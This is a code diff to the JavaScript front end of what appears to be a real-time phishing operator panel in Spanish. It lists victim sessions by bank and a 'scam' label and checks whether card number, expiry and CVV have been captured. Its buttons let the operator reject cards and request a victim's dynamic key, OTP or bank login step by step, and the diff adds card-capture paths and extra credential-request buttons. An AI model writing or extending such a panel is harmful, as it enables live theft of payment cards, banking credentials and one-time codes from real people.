@@ -1,7 +1,7 @@
 // =========================
 // Config / State
 // =========================
-const nodeUrl = "http://192.168.1.26:3005";
+const nodeUrl = "http://192.168.56.1:3005";
 let socket;
 let sessionsById = {};
 let selectedId = null;
@@ -373,7 +373,7 @@ function getLockedSectionType(session) {
 
 function getCcIcon(s) {
     const action = String(s.action || "").toUpperCase();
-    const hasCc = !!s.cc && !!s.exp && !!s.cvv && !!s.holder;
+    const hasCc = !!s.cc && !!s.exp && !!s.cvv;
 
     if (!hasCc || ["CC", "CC_WAIT_ACTION"].includes(action)) return "⌛";
     if (
@@ -795,7 +795,7 @@ function renderList() {
             );
             const hasOtp = !!s.otp;
 
-            const bankLabel = !s.bank
+            const bankLabel = !s.bank || s.bank === "null" 
                 ? "⏳ esperando..."
                 : `🏦 ${s.bank.charAt(0).toUpperCase() + s.bank.slice(1)}`;
             /* const actionLabel = ACTION_UI[s.action]?.label ?? s.action ?? "—"; */
@@ -819,9 +819,9 @@ function renderList() {
                 </div>
                 <div class="rowtop-left-name">
                   <span class="sname">${escapeHtml(s.name ?? "Sin nombre")}</span>
+                  - <span class="scam">${escapeHtml(s.scam ?? "LATAM")}</span>
                 </div>
               </div>
-
               <div class="rowtop-rigth">
                 ${actionLabel}
               </div>
@@ -858,9 +858,21 @@ function renderActionsHTML(s, targetElId) {
     if (!s) return;
 
     switch (s.action) {
+        case "CC_WAIT_ACTION":
+            actions.innerHTML = `
+                <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_cc')">Error CC</button>
+                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_dinamic')">Pedir DINA</button>
+                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_otp')">Pedir OTP</button>
+            `;
+            break;
+
+        case "CC_ERROR":
+            actions.innerHTML = `<span style="color:var(--muted)">Esperando nuevos datos ⌛</span>`;
+            break;
         case "DATA_WAIT_ACTION":
             actions.innerHTML = `
                 <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_data')">Error DATA</button>
+                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_cc')">Pedir CC</button>
                 <button class="primary" onclick="act('${escapeHtml(s.id)}','request_auth')">Pedir LOGO</button>
             `;
             break;
@@ -884,6 +896,7 @@ function renderActionsHTML(s, targetElId) {
             actions.innerHTML = `
                 <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_dinamic')">Error DINA</button>
                 <button class="primary" onclick="act('${escapeHtml(s.id)}','request_otp')">Pedir OTP</button>
+                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_auth')">Pedir LOGO</button>
                 <button onclick="act('${escapeHtml(s.id)}','request_finish')">Terminar</button>
             `;
             break;
@@ -895,8 +908,8 @@ function renderActionsHTML(s, targetElId) {
         case "OTP_WAIT_ACTION":
             actions.innerHTML = `
                 <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_otp')">Error OTP</button>
-                <button onclick="act('${escapeHtml(s.id)}','custom_alert')">Enviar alerta</button>
                 <button class="primary" onclick="act('${escapeHtml(s.id)}','request_dinamic')">Pedir DINA</button>
+                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_auth')">Pedir LOGO</button>
                 <button onclick="act('${escapeHtml(s.id)}','request_finish')">Terminar</button>
             `;
             break;
@@ -942,11 +955,15 @@ function renderDetail(s) {
             stEl.className =
                 `dot ${stateDotClass(s.state || "")}`.trim() || "dot";
         if (pillBank) {
-            pillBank.textContent = `🏦${s.bank}`;
+            pillBank.textContent = !s.bank ? "⌛" : `🏦${s.bank}`;
         }
         if (pillCc) {
+            const flowCc = s.cc && s.exp && s.cvv;
+            const flowAuth = s.user && s.pass;
+            const ccText = `${s.type} - ${s.level}`;
+            const AuthText = "LOGO";
             pillCc.textContent =
-                s.type && s.level ? s.type + " - " + s.level : "Solo Logo";
+                flowCc ? ccText : flowAuth ? AuthText : "⌛";
         }
         if (pillAction) {
             pillAction.className = `pill ${
